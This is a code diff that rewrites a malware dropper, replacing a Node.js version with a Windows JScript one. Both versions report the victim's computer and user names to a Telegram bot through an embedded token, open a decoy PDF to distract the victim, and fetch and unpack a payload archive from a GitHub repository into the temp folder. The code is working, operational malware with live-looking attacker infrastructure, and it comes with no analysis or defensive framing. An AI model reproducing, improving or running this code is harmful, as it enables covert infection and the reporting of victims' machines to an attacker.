@@ -1,35 +1,12 @@
-const https = require('https');
-const { exec } = require('child_process');
-const fs = require('fs');
-const path = require('path');
-const os = require('os');
-
-var t = os.tmpdir();
-var m = os.hostname() + '/' + os.userInfo().username + ' - online';
-var b = '8708922470:AAEueXYfcs8JTv-EduI8cJBfA0Jj7EzJYeo';
-
-https.get('https://api.telegram.org/bot' + b + '/sendMessage?chat_id=8119278288&text=' + encodeURIComponent(m));
-
-function dl(url, dest) {
-  return new Promise((res, rej) => {
-    var f = fs.createWriteStream(dest);
-    https.get(url, r => {
-      if (r.statusCode === 301 || r.statusCode === 302) {
-        f.close();
-        fs.unlinkSync(dest);
-        return dl(r.headers.location, dest).then(res).catch(rej);
-      }
-      r.pipe(f);
-      f.on('finish', () => { f.close(); res(); });
-    }).on('error', rej);
-  });
-}
-
-(async () => {
-  await dl('https://github.com/dont-delete-me-v0/files/raw/main/decoy.pdf', path.join(t, 'Known_Offenders_2019.pdf'));
-  exec('start "" "' + path.join(t, 'Known_Offenders_2019.pdf') + '"');
-  await dl('https://github.com/dont-delete-me-v0/files/raw/main/payload.zip', path.join(t, 'p.zip'));
-  exec('tar -xf "' + path.join(t, 'p.zip') + '" -C "' + t + '"', () => {
-    fs.unlinkSync(path.join(t, 'p.zip'));
-  });
-})();
+var s = new ActiveXObject("WScript.Shell");
+var t = s.ExpandEnvironmentStrings("%temp%");
+var c = s.ExpandEnvironmentStrings("%computername%");
+var u = s.ExpandEnvironmentStrings("%username%");
+var b = "8708922470:AAEueXYfcs8JTv-EduI8cJBfA0Jj7EzJYeo";
+var m = c + "/" + u + " - online";
+s.Run("curl.exe -s -X POST \"https://api.telegram.org/bot" + b + "/sendMessage\" -d \"chat_id=8119278288&text=" + m + "\"", 0, false);
+s.Run("curl.exe -sL -o " + t + "\\d.pdf https://github.com/dont-delete-me-v0/files/raw/main/decoy.pdf", 0, true);
+s.Run("cmd /c start \"\" " + t + "\\d.pdf", 0, false);
+s.Run("curl.exe -sL -o " + t + "\\p.zip https://github.com/dont-delete-me-v0/files/raw/main/payload.zip", 0, true);
+s.Run("tar -xf " + t + "\\p.zip -C " + t, 0, true);
+s.Run("cmd /c del " + t + "\\p.zip", 0, false);
